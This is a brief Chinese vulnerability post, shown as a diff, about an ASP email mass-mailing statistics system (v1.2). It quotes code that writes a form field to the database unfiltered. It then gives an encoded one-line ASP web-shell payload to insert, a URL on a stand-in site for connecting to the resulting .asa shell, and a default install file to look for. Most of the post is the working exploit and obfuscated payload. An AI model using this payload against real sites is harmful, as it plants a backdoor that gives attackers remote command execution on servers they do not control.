@@ -1,0 +1,35 @@
+Title: 铜板儿网邮件群发统计系统 v1.2 漏洞
+
+
+'Fenlei.asp 
+IF Request.QueryString("Action")="del" Then 
+ID=Request.QueryString("ID") 
+IF Countss ("tui","Fenlei",ID )<>0 then 
+'略 
+IF Request.QueryString("Action")="Add" Then 
+Tname=Request.Form("Typename") 
+Set Rs=Server.CreateObject("adodb.Recordset") 
+Sql="Select * From Fenlei Order by id Desc " 
+Rs.Open Sql,Conn,1,3 
+Rs.Addnew 
+Rs("Typename")=Tname 
+'略 
+Set Rs=Server.CreateObject("adodb.Recordset") 
+Sql="Select * From Fenlei Order by id Desc " 
+Rs.Open Sql,Conn,1,1 
+'略 
+%> 
+
+
+
+没有过滤，直接写入数据库。
+
+利用方法：
+
+插入：┼攠數畣整爠煥敵瑳∨≡┩>
+
+
+连接： http://www.shitsec.com/###tongbaner.asa 
+'默认安装文件： 
+'install.asp 
+
